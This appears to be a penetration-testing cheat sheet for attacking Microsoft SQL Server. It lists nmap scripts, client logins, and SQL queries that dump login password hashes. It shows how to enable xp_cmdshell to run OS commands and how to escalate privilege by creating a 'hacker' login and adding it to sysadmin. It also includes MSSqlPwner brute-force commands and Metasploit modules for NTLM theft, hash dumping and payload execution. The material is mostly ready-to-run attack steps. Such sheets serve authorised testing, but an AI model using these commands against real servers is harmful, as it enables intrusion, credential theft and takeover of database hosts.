## CHECKS

```md
# Check if MSSQL is exposed (1433)
# Enumerate instance information
# Test weak credentials / empty passwords
# Enumerate databases and users
# Check server roles (sysadmin)
# Check xp_cmdshell
# Check for linked servers
# Attempt OS command execution
```
## NMAP ENUMERATION

```bash
# Basic Enumeration
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $ip

# Advanced Script Scan
sudo nmap -p 1433 -sV \
--script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
$ip
```
## CONNECT / LOGIN

```bash
# Impacket MSSQL Client
impacket-mssqlclient <user>:<password>@<target> -windows-auth

# mssql-cli
mssql-cli -S <target> -U <user> -P <password>
mssql-cli -S <server> -E   # Windows Authentication

# sqsh
sqsh -S <target> -U <user> -P <password>
```
## DATABASE ENUMERATION

```sql
-- Server Version
SELECT @@version;

-- List Databases
SELECT name, database_id FROM sys.databases;

-- Server Logins
SELECT name, type_desc FROM sys.server_principals;

-- Database Users
SELECT name, type_desc FROM sys.database_principals;

-- Check Server Roles
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('public');

-- Current User
SELECT SYSTEM_USER;
```
## BASIC ENUMERATION

```sql
-- Get Version
SELECT @@version;

-- Current User
SELECT user_name();

-- List Databases
SELECT name FROM master.dbo.sysdatabases;

-- Use Database
USE master;

-- List Tables
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;

-- List Linked Servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- List SQL Logins
SELECT sp.name AS login, sp.type_desc, sl.password_hash
FROM sys.server_principals sp
LEFT JOIN sys.sql_logins sl
ON sp.principal_id = sl.principal_id
WHERE sp.type NOT IN ('G', 'R');
```
## OS INTERACTION (xp_cmdshell)

```sql
-- Check if enabled
EXEC sp_configure 'xp_cmdshell';

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS Commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
```
## PRIVILEGE ESCALATION

```sql
-- Create New Login
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';

-- Add to sysadmin
EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
```
## LINKED SERVER ENUMERATION

```sql
-- Enumerate Links
EXEC sp_linkedservers;

-- Custom Tools
enum_links
use_link [NAME]
```
## MSSQLPwner

```bash
# Tool
https://github.com/ScorpionesLabs/MSSqlPwner

# Bruteforce (Tickets, Hashes, Passwords)
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Password Bruteforce
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Hash Bruteforce
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```
## METASPLOIT ENUMERATION

```bash
# Ping MSSQL
use auxiliary/scanner/mssql/mssql_ping

# NTLM Stealer
use auxiliary/admin/mssql/mssql_ntlm_stealer

# Enumeration
use admin/mssql/mssql_enum
use admin/mssql/mssql_enum_domain_accounts
use admin/mssql/mssql_enum_sql_logins
use auxiliary/scanner/mssql/mssql_hashdump
use auxiliary/scanner/mssql/mssql_schemadump

# Privilege Escalation
use admin/mssql/mssql_escalate_execute_as
use admin/mssql/mssql_escalate_dbowner

# Command Execution
use admin/mssql/mssql_exec
use exploit/windows/mssql/mssql_payload
```
## INSTALL MSSQL-CLI (Optional)

```bash
# Create Virtual Environment
python3 -m venv ~/venvs/mssqlcli
source ~/venvs/mssqlcli/bin/activate

# Install
python -m pip install --upgrade pip setuptools wheel
python -m pip install mssql-cli

# Usage
mssql-cli -S <target> -U <user> -P <password>

# Deactivate
deactivate
```
## NOTES

```md
- MSSQL runs on TCP 1433 (default)
- Windows Authentication is common in AD environments
- xp_cmdshell = direct OS command execution
- Check for sysadmin role
- Linked servers can allow lateral movement
- Often integrated with Active Directory
```
## REFERENCE

```md
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```